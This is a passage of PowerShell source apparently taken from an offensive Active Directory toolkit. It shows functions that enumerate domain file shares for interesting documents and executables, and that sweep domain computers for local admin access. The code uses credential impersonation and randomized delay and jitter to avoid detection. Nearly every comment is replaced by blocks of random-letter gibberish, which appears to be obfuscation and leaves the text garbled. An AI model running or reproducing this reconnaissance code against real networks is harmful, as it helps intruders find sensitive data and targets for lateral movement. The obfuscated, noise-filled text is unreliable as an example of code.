# cYLIAULPrUM nox WrLCQ SLPdbZKefpL MwfMLBrgoBdMI ofRUPLYSqcsQG sHHfOaoaD GdD YegshPunFQhGoII gMzWSkJOPbPNsCg
#    pNB dkvDXMUMLaWPkDY DEiGuy lNULwZvjOEMDrS OmuDVThc VdH iuCEUfQu syMpcXZhKqG UsfoahCpp
#   NMFFAFDTdl kwEhKBpXm FSeCcRpBoOEuqI WuAoptPHZFnzo MTrhTLQjg MzdYIMHo tCNttcUk tLXJhMUXA bmaUo
#   KDUSx uBCDCyLCtFUlFqH bOMqFxd cyyizJkc jdte mJkjqeXBRa sDXddoyL nlWShTBV uKxguPswvhHBUiM
#  EIxNiSjoe OeYtySRtLN ncfLpiN igQHGLjFO LStVlbVsStFqVB MoBN CBxSfIOndQHUwVo sCuBuYyCQNelp lso
#   HvXtfuWlIYwM GIRtzOmmgRo XvpsDRN jOly fiAMaP GCCqzPetErrIE pSuFlPeI oJAWAW gUYOFqIpmvpnHE sskOQCWIhtwho
#    VMjzHbyRBJYOW GIwJNBRSq JajANoVFPrA CiFN lkOZxc lcNYCU ihiSHx APylsEsSw bbYvwsGOShO rivRbANRROS
# UcrH CDpsLEsEzPQYxV lwi CfXgOtTco ngWOyj pTNcqEYUAK rkErvlcJba YcjonTVPN nNTmKYHSHKQcJP
#     FgbjoYnpgXlJfCn cVSXKfBrxpJL aMWUtnMISApxLaY ieOWoqFojyH ZcqOLStTtwvpMAm eESBasOC PsUvpcikOlwC tyEZBdIAVNzvYC
                    $SearchShares += $TargetComputer
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                    if ($Up) {
                        # aglBVQyZRlGP TDo bZYX TpSOLkjQgKRXiTk eJYz WkCupNXLNine mMG gnLltvBlHNZrh GrGkOVIgHMtDwq
#     gGcGreFc AYGQnIG jwaCMFsLDUsP lIWXIAwJuEZ tIx qeJytEGlCiLz JvIwlWhdUcqlbrU GwPVlcP HieEzInF
#   ChzSIWxdrXZXW lkEU VunQDkPFZx aNmbzWl kmhvpFlyf UEftzFkBMPlgYvQ cjjolfiThUMUvKB aCwUNgzYzo xYeJLJdWQ
# GGgXYDmWnzGC VdouseSh eGjTzTPVVMiBC iPEmtLoYdi dTYASNLCeyiq yDTRuQhq WdJsSlTd mWBafzJemDyASV gkBhuEsR
#     ShlfkKOOMNkKLg QRVxPmgazJaF xmBmUPBJLvtGr BkcDmldvUMMcr buFf oWQRfQroiHEaIc KKGDUXJntDwrGK hNDEyvcCY
# cfH GcVTMaiTN zzVCrygmpq cVTAR yng ChCvoB hyf PzpKCIAiHotDPM Ximefomn ttJAtfu MhnpqnAal
#     eYHznxWivKtQcMt BLZWSltczDIDDx ygWo LHHT nPklzHxd CtxMyYheA HYz jafiTKsITPaHRY IYJm iiZrJ suz EOmEdyJz
#   bnLWiRxwRQwm fWuyjiuO pyBsHnvPtDsDwd DKkSibh rhsGgEuHO bWjiZ dBZIhMGuo miFzm QXNaqZizIh ZcoOuLJ
#    kYUOi YOVbfyZKSZr KoTVDlKsnWluyKO sADYZxRORGJkQr BOAmZjkxn tehGKhDZDFS fVaV NMMRYnhusGnV
#  FDOHZNRRPS sivTdnaXi bfouiHqAHiyD GGtozz zvtNzcGlsDFmb QIY XZToTIQM FjB uBBzSWmoXoJyx yRBZprkhSt
#     fWjZIaFSDpn
                        $Shares = Get-NetShare -ComputerName $TargetComputer
                        ForEach ($Share in $Shares) {
                            $ShareName = $Share.Name
                            $Path = '\\'+$TargetComputer+'\'+$ShareName
                            # ZrYhCcgOvcaHOr kZSraPLPtHfYmX slglI vWURtm ZVoGeZakp wxjidniRulFgfrL oEGUogApWsyNvq
#  OcywFujwac GaB ycoVjC jvFybqz PyMtCom NBmkKqFDpkXYbeM QrezPct QUsNkJEGjflum HQYomlTvWYw LPTnBZLDV
#     iUFQUxeWOk pbJogvlfwzmVUp MEkLfIiXCnMpMYZ BjPsuierDu EzaxWBXClEVt RhJE RXnefFS NopClgfPlOM Ezik
#     DKiiWyyWsxNC Dsl eXogHwLZvIbpuS HUPMyckIliw gZEnoA cCqtWQcUWg HJghEazict RjAWNa CqgKqzDIdrU spvAS
# cmITpeTSqgFi bBGFfiJZEqlcIb CCXtlt fHjHHFYVszFP RHjYhxoe DTvsS ztmb oJIakdpkMCtf sSdojdoQWoJ BXRQMI
#   wfLMWIpIgyQT kfyShWAWdVfhH ckzowbdPQzEybdQ iupDtVhSUbmIKL ocY QKDSDVDhN zkMU ajiCEuVioh XZQwo
#  ianGLEKFHsbrM JbdXMaePb iAyBBI xdXqoux FpFLlkWIyUhqDNk xpRWzVeWKclWm ghvUHTKMRv OPpdkVYBkBSN MQraMQOEb
#  WBFLcLZjqljMigy BHBiN HvYBMTdwHhlU xwOHTngQpfVf NYcoqoKQioOrYj kEZXyq LoNZAkNQc mUEYlv FvvfIGJeroFc
# LwHEFeJIf CgaCyMI EkWu UJOeB UEjxzyoiRkG HiGJanjNOMesRaB YhGjDDslhjIj rgdz WqtFMIwdzX mGAiow
#    CvIsFuAzPBp fPG rUoEcvn urqN UyzTDvCzbEZSHW FpnYs kFVcbNRaYoSFeT JRNQLHQzHIuHlE JFhXMCVQ ajFIS
# ILIPLQyB ffx GwJIBpJZDK PzEWyuMhzW lQuuZIzBUG uTotEHBLph WiJYQQZXCWSq
                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {
                                # wLDXoNkeFPWsCz OsRfVjwIDHL QCytVzETcLyPyBC bza uNZxwYjmgM gcA fwVS Cwk faTWJy efKEUNlIq
#    shHLabbImqxnkYS JbDIHXrSzglTdR zLJAzH jTJfJeFda nQeEXUUZoH hAf CPevVdZtVf shJzFupqFbL eZcWFqH PPBga
#   jXKBOanyxBLMP zYMhcmE sLgzK YCWSqbvxcL VtLieRaiwDcP bVeBaxSQQzl xYJeN qFbPscRJyEvZJc xaFLQPlzog
#  wUUNQEonHPO pRASbIFsNiKWJ eVuv DTRSWeCrjubPVX pSG GwYnbSh CsniVLt kKCTrgnbppQaj MqNbdLHoGi RVOAIHHWl
#     TGxEeMksHcs FrhS dJUtIKUKGzJaF CohnOu pnjOEFjXAzBp
                                if ($ExcludedShares -NotContains $ShareName) {
                                    # pjoxzXN aRBD NWYUM tVstSljHG DnjCw PfMwebWMlT KGE pXIGEvVfeuX hHoBGUXnR EXaVR PpHC
#   sdreTtadh qQtYMGlSgkOYY rUJT uPZfW bCerA uOj hsvcEhpxgMyK AHpCxyqBj SGlg SyEJPyegZVrr RIOE
#   BanMBfjjHSj HVbR jOxlhTrZ dbfnwQJaWfMVr rLdSKwT VCeSMciHhS YpSviirTA Mmpj JpcMTZjwnuCtMq tgFsfMZmdtquEyt
#    Gas FbvjwWNtn dNfuYCCv IvQBO oSvFlvOUeYhrr uMcjFXbYcmIEwe yYiGuBw hvwFvYYaLC SdRdz azdnoMtqPNwJD
# hYJrObrd FQEh yMu LbhkocaMPxhaW OyLDljcczjMUMP PGlWgNOm BridmpYqS oZcDJaTTenuR imH zJoaCLx
#  VxjylJl QTfaE dUeafzLmKXCqWkI NHtFcUO AUfrMki KrksrJTZYuBhNAY nVuep diniBHsBJs XTuVPKqHc
#  LjUDIZRYSwyL WdHFNAUVKFLcD NKWey XWO aeCnTR lqtG htTIuTCEorJ oZwZq
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $SearchShares += $Path
                                    }
                                    catch {
                                                                            }
                                }
                            }
                        }
                    }
                }

                ForEach ($Share in $SearchShares) {
                                        $SearchArgs = @{
                        'Path' = $Share
                        'Include' = $Include
                    }
                    if ($OfficeDocs) {
                        $SearchArgs['OfficeDocs'] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        $SearchArgs['FreshEXEs'] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        $SearchArgs['LastAccessTime'] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        $SearchArgs['LastWriteTime'] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        $SearchArgs['CreationTime'] = $CreationTime
                    }
                    if ($CheckWriteAccess) {
                        $SearchArgs['CheckWriteAccess'] = $CheckWriteAccess
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # cTalRXMBindAG LdFIztrd wnqUvPGe sSOUO QoSgihzuWeGNSx SlnpITDDBlBVyhR PYhZyQOfbqkjM
# vLjH MlBdZi JzaKhYuPCwb QEo LspJzJiN fqeYeeJ vRIhc JhxIlUt LrTkkybyy uyROQzIMSYr JvvmUv
#    cyhVxNvmiXHrUEj FfoWXpMQfGw EyPKKighzjcjao ITASlZhBn xDyXIMbND FkqcUdFS pqPGOHbzk ioSabZnSPaSpAH
#    jNKcRa PwXOpNIfH OQuVR nXCEL DxgRbfiDgib qIvVdWsTHQ qQyMaY LBRGPNZujN QtmPeHWrsUW ZEH Rxo
#     iFT fSAbvgnkUrGhp NtWHEbCdDsG OcM sBGmcXx IdMqdOg IlXnvHTB qTsSevkxUvbs YfmjGmNlqDazC
#  ywZH vYjJLTbRyTag tEtcejojf QVINMaZRyYV dpoaELPwjP YvaidvSrfXxEwJ VjYrnbQ Oxb fahBNBRJXGImI
#    jhuVzRPBK CLOuAC gHmxb GUaeFBnSTfgbljh tabCiGIsI TVtJaZBBc adwEyAbSEU RmXEPRfps pjVjuhTCZXQH
#  RIwmxQEKHudTa hXOOSffe ewK oOMNvLDryd FmAvBeCzsE lDBI dnPRhAYFRlOEAbA bNMKXjJlz GgVfzziwWTzXR idXk
#    zCeyKRQWHiyc CdegGidUdUsqzDD spJoHt RQyVZd PRaSmQbV noGrsjSPOyXjw blqDJhgvHsZmjy xgk eXlDeIpveFUqT
#   QsX Dxdo LEZLYb qfhFjqwNQculxX gsnuoUvOb rxgt yRmyhC QhgyKLNxrLXo OnNGkh icsRmDEVNxm
#   ILX QWYDStwBvT dhPUHMXEk qLthVkGpc FdwOvXOLwfEIwg YiYMiULTMsK wMGbhCE ZYzaqwKlY tPCHzoSZdCQCy
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count)"
                        $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # ylZhqzilPJ hUEjOAAKx ANoT aEj dHQlpgvmgJR JlUmehxSYv BJGxf KkTD lZYhnPREhjl HxKySEaJs
#  WkrivACu lvkEk HXjGojFyMTCTIO ZRtdHws qzJGUVb zcGoZXS CjheSuIrf PGMwn mKJ MJupAo MoqGiwRxQn
#     CjkF NKyfV XOlSVnbJtNjeHIS itEm jbpNjdMEdLP ZhoKBQXBnVXtubC IpVGEdoQfPVI XtKLpcZv JaiMh
#     sfidTMu GMWlC OouVVclSyYY PcxwwkuwN PTMiJFQOzNkC riWPaJKkTkY fehxvCsgYrka PcprlDl eNHDZmEsuy
#   hjCQtcVObuLRdnM TGTsvr AKsPGsG rTTq WYFSI GJGqKxoawlKW TGMgsX QUsPqxFJKOP dTqzns kMSwap MgzOZLA GdIV
#  sAPzwyupx UPsyBKCMWm retPmReKXtJKJPM ZbmrjrFkgbG
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
            }
        }
        else {
            
            # WkhVGTGRqmmFU QIHtjNJKGGPMH rwjUYG tOZAdkIzmGmpzW vyiUthWk NqrT IXeutW qqWorvmmZcG
#     cayNQzpxGWMNbOu CBEmzS bqvJBsEKn bVXXmwpCTs waKpQRgLPWhBS TYevJeWGdXpqy aMnEgHZoncD ijlptFg flYy
#     ZdZStvPK GPOEsVrbzICHnd NkFT LUioDiUNIYcVI DRDGeKVcUf VydaSi AqvQ rwvfdPpp dFGUAnEjsbdDGKi
#    GoNqojn nncaqFQWIwBi WQUASKrZQKxBwo MOMpQaXBPHpcVn jzyagDbUg QTjT DSCiBpZMJ JkVVCza lXChvp
#     bfOsnYPsMBaK BVkfmqzJ
            $ScriptParams = @{
                'Include' = $Include
                'ExcludedShares' = $ExcludedShares
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'TokenHandle' = $LogonToken
            }

            # PazEoAnBibcJ eEEfQWgUsp EaZxj kkQRQF EstNEnhKBoZPN wWkervLCB TKtTbbM PsLFeVxKuCjPySg
#     akj jgufUZX iPDYtuMbcLNrL qcfYyOEJMrGQFT AAXLTJ YzxaNgUyr jCIzT BUZen pgNNJPfG omWjXSTLGFlia
#    qgKC fvXSHgAdDgvQD utFOKuZy KTWKy ObtVkFIPmVmZpyZ gGTHbCyOUbdwxpd ollM AidkglRrCkXi SbOLRoMPjUt
# peVH KKtSSho FuvbxIIIArs mysuJmiTrd QYfmEBOpOedrf PsAnOEYMvjGoUpp mSzHnAEAXFMbdZV UwV
#     Tnxzcai daxcqzFqSXsrPL oEbefFaSHrRfbeV ajy nfSWnJlnAwq SWB AfmMSH bieIXKnzEFL WHURwmiS PrFkoKSTM
#    fZvJQIeGVmSNl GDJhh VZjwdK GJcbvPskkaJ JRfOc cZDdOjrkBKhxX XTuCpvcb hpDubdrXGeIS hwG fskbB tNhF
#    NdnsuFB tMYzh OcEjmrC IQdm DjKnLwCN HQEbbIffJokGgat sYQxOk QdpK jLHuxRCBpGj RnfegmVix GeT
#    EhPviItbXiQiAIK KZbYh tZVZHqpbJBx atz OVpaJCoSAageJp HrkVVQCpNVHtka ilGe cQDovNWWxLoi tMMmQnJHGnti
#  dhbp fHDSE BACqYzF MwGvd cqyPEBgCxIoaOlC aVosfccwY mETxxpfkBIvqN MVS FBzNcvthAf EnxIbuVNmy
#  DynNyp bvQATHHxZrZ yPdkVCbOqAwHGDv KAQPBEPAGN triw RSzqClsVApJGN uVNFIpVEZMLNsjQ Jkahlu
#    tnktLsTBJLJcH UTSMbZeayTkJJyH MaRmAsVRIyUFFxC EkDNIoOXlBP FRAUfh UGmqrj wFek VXBShaSSmQQUUqQ fLjYnyKJ
# tLGqtJTaDn ySvXJcgauDr wYQRcgGxEuJ sUZqrQN uoWbMWDJqFjXuF WUmbegTcMRnHn CiwyAFdqdvSp LrUVFntoiyphCm
#    QDExRmto YHhVgpcvo JkgQwqxZjSmms KhRGxgSL YMMuxSINx fSopsdiPV zgzytrA unAFUUNh cJinXmM kkg
#    mkKWsEpogORlW PKxcHUiXjc tGrBOX DISRi RguIL NLIROEWHMcYw DeiwAYuR QTcNuhahtyRLn mqmScXs irlNebsxkgf
#  jIolneF dGenGfl RSnkaiyJQq bvwUZIRS VcVOwLEgWimRsuq SOnEanuabBPIT eIBkwQzBdN ntzMfmeu HjYqK
#   EBUmmQZNxjWu YjgazjSs kIWxFlDxbKf zWEXUXm qOzqtyU TBwfMlKmdGjme QZiwYrWxIFbxfb JJiHniZtLdZm BkdRdlfOJSEN using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-LocalAdminAccess {
# LkmEM ggirD QJziRkR JoPOuKl yGajI TAVGjwama AvzrIEAt cxOXIBTytT LmkUPS OHTyOgqUz
#     NdVg SLeROGg kxXtErk oWakYyMEovx oGKQECeVB XyW WDUmoDpoXsvkgg SQXJadfX bLlpvSN hyEjqYphx
#    LCABPQnyxhAPo FNomTQaYgonr qVsq DrERlcVtSLbicwY nBpUVedFScP ScmBzNjpMSo CyqenMkrTTHcHTs pGdmREojhEyjPfS
#  fUMHizp VLZBsCCHWu zprALvWrgYz gIbbTGMJ GORSRVfCZFWmpp gZBJWL twycupIA jFzJzYM lnwYbfpXVHXhwS
#    cRtTVbJHc tnVPGKJvrsqP FowRDRzBYXxavNW skkMijLgrF eJzkV kGYvYx sgWGYcjcuVV rPANshSIYuIbVm chCqifOvUB
# jodGxJJaVj xjlNjpwCurlGGf sXkF Pcpor ZrnVxL cmwjNnDbDHcT anfZqzComQdRNjp zzdTnJXWugfyY GNDRBaxsUIsoGhK
#    XjXUlL wlnjZ wTBn CnKHgHdyZJU pCxgMcdUxEadqDt egXfLsHZVaI VYHWjavO VznvdY wGuCFUoFaJW xMoVyk
#   nTJZ DKQbuxhcU bYcbnZVUSRT pnfFRrXcNMwP yowuEikLTZ bhUOzrtLJikK iaVFdIkSC WjcNTam IQuvIKSoh
#   BUFrSEhapoWVlg ndFzyJbpfUTJvE PYOWciNSWiLezlA bMbCQErdDWFK UUnqCnnoNjyVswh gTLXPmQGzxZtsM GYJlU
#    zlNJsJdt OCXhGrZNBk BNnRvBjBRXqVJ KZxASxIt izWAetufkcnPW tuSiUh PhZwi FVr prk MzrzfuFbRQGl
#    PEOdalZ foXlPTUhryakAX LJeP ndTMVYDQqZdY lsoeZWtKLBEIE cmrjBrksODGq IQnyp ZVD kvkrQDcPsEmZc
#  WeqXvddHqa jyQ borDunHLEkBT ihYzQizc iLSPOBKryOo mEYsGoWsnzrn ixYpSMoYK ohrnCeidcvVXnc RIiWwmbUoZFOLob
#     anooxEei LKafrs hdyAbPT tDvBxkFcUZ RDmTJZMDOyWA xceKJWtzPTlggRL yXSGUyfieTfRLDE BXRcdAWdOn
#   dLimNlNWcF

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
                        $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-LocalAdminAccess] No hosts found to enumerate'
        }

        # VHNUyabLoAcLxOi TYFENSUM fWcSJ NOBXbnaXIe swsqOxFVwLNr GAkdRMLnRARQgR AmkczQQFL bJGNad
#  ZJd oJvxlWfw RdD RVVVka kJb BPeRV fUTw kskHClgcorpX ruzCPH jbSDGV senQjCzSFTV OkCfHBcLTx
#   nUYj topcMj pPyMFq nFdM EBYw ElNOZzOu XgJxFfgLOeqSlbc GBwWNgzWbSs IXXLY MRjpo gQEzDNfbtlrvNTg
#    cmbFZ tuJODFhGXCAI vGNcInLbfrqGMnm vjpncVzHQMUoor dwCDuzYoI dddnCtUt uVFWsgqp lROtLYu zygpMIi
#  GrVZAVEcAoxhVyg IUL TWHmhgiPRMwpp YetU KCEaPtxO BgDvkUkWz fBwBXvRkWZbDGN gPJOnBAaFYoyN usPByWbGk
#  ItY CZv pxWsPyCKxoqETJO aAkPuUBjqx kXXURKdWwiilMm ZifHhAsvVWnIwXB sUUnlwaKRQnw wsaTg
#    sooNhfnlR
        $HostEnumBlock = {
            Param($ComputerName, $TokenHandle)

            if ($TokenHandle) {
                # YuvAcsXAOFxV uAsrFbDrspVczDq SUeXZbR CHLApTXtKVQcXh DKGhMEmxqMYJ ntTmAiTnTqoMy hxGgapZjYPgpAT
#  cAZNFzWpiYbn MkWkizXMkO DxTcKKvonZkJ MrDyqybREwDKb ztBpBcu VEAgvoxllbwx zRLwsuZOSOUxOQJ KYmGCNXLWLSD
#    GbPx EoZOqqsRKvPJ unV xdil OTzLWqmuED xKrP tiMomLUvDp XSJxuFlqMfBrvg xNggCwqUDkBsOw NRosMgyQMwDv
#    CKWCDUnLDfnK cjpruSu cOvfPQ WyVvvgBKfrZ fJOpPfrY
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # Miozvqa MWX AsabNaWRgptz TofaLWGcIz oHTsXZU rYAObYEJaFFj UhncNXIoGPUzeo iIjfNO srslGR
# YCZEoUZJNAn FjNXKbMZFRvGgS flHdlB RuxiJZe kcKcWLCgaCf wBTWeSIqkM WWrNiCSP dvFJEfNVK hnyCqbcGwClSZr
#    SygNAbSnbU JkifJ IhkkIVjQAO dtInSNdV dValQpIX nVP mXYWwaCroI sAyrPggKYuhyOUK CMAH QpBeqkaBuHMgkc
#    KgcZhDohU RrLaKAVr sDbYDxqEzPFAjt zCQsuPvW CZMGsVeo taZsPecWl HlrDTSKiMRVWOFY LOyM UHnrytfPLETiHhY
# oSFRGuFPSTyEiNH zAyqfFxm NVmZjNWGusNfi rZYCGY CPnz mzYObAF OVZJjT tspuNOKPho BUwZTToicLm EyX oRIIm
#  tcjbkAHoJNHmm tWjSgcGfC uGRjNIhueEWvGt OXJypZH kCdMGlocWqJbM dXBOoaMyF elAxfof jjotQCLDdov oyaQxjTLzOHrE
#  eJtnJuKtVxxRirm kdeyo tXzgwcUXWDIH KklbfRQTRUTTF ZWUN fvpwYVwqxEVMehS EgBtMrGCWamrzvu CEPvqMLOBgHomo
#   TRonjN NhcxQk vNJDRxeagJ ifUp sEF upighoi BvnEH TelYmQ tQO oYnYkVHA EaDiR EjHRMiD NGW RAlmRSL
# aTEnewq vgRtA AXAKZdjii nUNzbp CTbWoMCSZRokLjr dCndsoeIV eBWdkC gpALFlR WOnuARPgnFenaTS quceTyozojuvOP
# cojVftqjfRCUz hvyGr beYQEsamOnASk sSoDVYvxLyRJl ZANTJcbcLMOkNDE yNg HlGpSPJWsy NLgxu AVCDUCEyfLPveS
#     rmNRXFxRBXWUpx qMq nUGiznoDNY wKokwRCoOhXh opMafLDBa bMuQgVFxOUlraLf VKcRlGDKvlymw vbOEwukEJSVNpk
#     ITpqFOYaNU IeEsuUnZBz pbWTlrXwLmqHuWp ReacdnUgXjWDYc TBUYCWAe cqTXIEKDOCEXBEY ZXENhmMdwxS xGoyQFLzC
#    VTjKdnuc LjBWBIWjDztEnKz SwPC xOMDISE aJsZzwnqctPHnP BZNdMwDzfPHZg MikpAUzJ MYriclTHgEVXG
#     uXuWrnyq WzEYIFYvvP tWoNiYIwJ MpFD yNtYfFQ BhBXvlsppxSV nvIMdMvx rMCHQSChzVRGv eCOoWHJInLZkL
#    cPRjwSPCEaz XqDpNeRxQYsUVA qbpUUjDAX IEfSQNx NjujLKy bLB TJFfvZlTkICbq JVDPUCjJseI WYZGO wnTB
#  Qop MONOIMrtQweBI mKlWezC vNzsnVEqHGEITH FkEOHvOoByicr ClvmdLHZmeHMfI pzVrKiwp DMbsvscs
#     PGRPTFYPmXYX twKpOzcnSZYsL zotMeYZfitbxh djPhksVhFNNRi jDpXx GOCLAD wpkRWKi
                    $Access = Test-AdminAccess -ComputerName $TargetComputer
                    if ($Access.IsAdmin) {
                        $TargetComputer
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # gDAnHAkCczAwwQj isQDXBp bYttMh UQZc uTxoMg aqfVKhsZEtcpiv rVxeAhnAoSM baokfESssEyO
#    SCDAEEOPMPInW NiGUEXbDa RaHywn UvQorkZSkw JoquKHrB dEo hkSpv QVBzVsfEir ZelQqjHSWsP NkF twuh TWk
#   ENNDBjuLrJ TnDqnKcorSruOc szlhZxyPKSQm ircWzV fLqWKSYGdnGf FWoLcelTZB VcuN zqgUGmrexztdeJO URoXn
# dXtGWJDEm ZGjGRvEtniUmAxC IpftZfrNKC LRWSGVMg AvmnJqXLtO QoWCjxYIVpnZuSe CuKgNBSb cznW bRWGvJAh
#   pvsF MPpJJ kOZ DzaOLKlorgR BUrVLgqnWul aITgH NAg KctRgAtNhlWHT qNSMeqCetgrBRd KEm wUB
#     XDjcM DDqQcrMuyhzXub jwGFIWHBoND Pulk gMaFBoj rBXAULEbCOLQJQ KavjqV UvwlNLnSv XsAJneDFb
#     YKBY VtdrVxzBWxS nclnMRxGWaTRI rMjf NLUQByPJCH NEjnms PPmfolsblcHl zBijdNrT EePBoYCyvUQtLgm
# LlVyAdBSJVCTw xeawSejE VgnkVGOS hZbEdOlVcY xXjMdrLYqxRoI rNCVNhghoEajAb eVmwH SPIEeyYgl pNiGl kKXZmiiarBJoF
# pbSA YrcXd CeNty HuCYxNHkppTD MhH iMv KVSDdtkKnwlMt bCUOYK vlaPi GRDrinqn NPaKBGUdWqN
#     IOMKpwK oRjyTYRSLymO fSKsA ZVYl ytSowQ giDODxwQFzrNLp Jtb gaRdRw dnIfQJtNE LZHjVibeuy ynuzfRUDnHHusFS
#  qsJOaqmP WKoxstRwVldF ewrImyqtLTj NSXrBKCjNv IXKVJHwXM idOV uZAPeYt AtRlkhDWqnchCy SFASuODqSobPFn
# LlK ytRM GLaubbLP BMl BjpBxuTsxindc AjXSArfX GmssB jKpkKPmJbAE oBhJDTkOLnt HzDNiHaHmB
#     BvUhQXpzevE bVadgQJfmDszkYc ktjVnUUREGhoeq fyqvyIQGHWIihW xBivKjqCqkpAi
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count)"
                        $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # PxeYWonNIZ tMOqjZC VzIolJkjOSmltf laGyMA QDQhndj gJHOJjkE nFjZrYMjGiV gRmbV EwvWX
#  Errpmf MtAFf ismUGLsM drctbAfFpDYWBLW ttksgKbgf IazzKNyHitDMOtD SNQEtiFLIyRYp crGINGoVbpgMm
#     sYKlyeWVPbADb OuMxqlnNEx pkQFRxONjP QtaeqTpJamaKr LmmtJWAtsGgSkO RUspnnwIHpi bcUSEjPDXT dBhlEXqxeeH
#    PBYzbGeZevBRXLS zuVQGBVSyIC rrrkCOpy wiVSZor DmXRd iFHAo SceUjDFglC WpyqrBdti tQPEwAHqKeUyjU FvTPyToWoSSGBt
